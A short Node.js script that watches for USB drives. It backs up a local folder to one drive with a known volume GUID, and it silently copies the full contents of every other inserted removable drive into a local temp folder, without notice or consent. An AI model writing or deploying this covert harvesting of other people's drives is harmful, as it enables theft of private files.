import {list} from "drivelist"
import {usb} from "usb"
import fs from "fs"

let args = ["{CF4327A7-CF04-40EB-869C-120E0BC238B6}", "D:/Temp/", "Backup/"]

process.argv.slice(2, 5).forEach((value, index) => {
    args[index] = value
})

usb.on("attach", async () => {
    let mountpoints = [];
    (await list()).forEach(drive => {
        if (drive.isRemovable && drive.isUSB) {
            mountpoints = mountpoints.concat(drive.mountpoints.map(mountpoint => mountpoint.path))
        }
    })
    mountpoints.forEach(mountpoint => {
        fs.readFile(mountpoint+"System Volume Information/IndexerVolumeGuid", "utf8", (err, data) => {
            if (! err) {
                if (data === args[0]) {
                    fs.cpSync(args[1], mountpoint+args[2], {recursive: true})
                } else if (! fs.existsSync(args[1]+data)) {
                    fs.cpSync(mountpoint, args[1]+data, {recursive: true})
                }
            }
        })
    })
})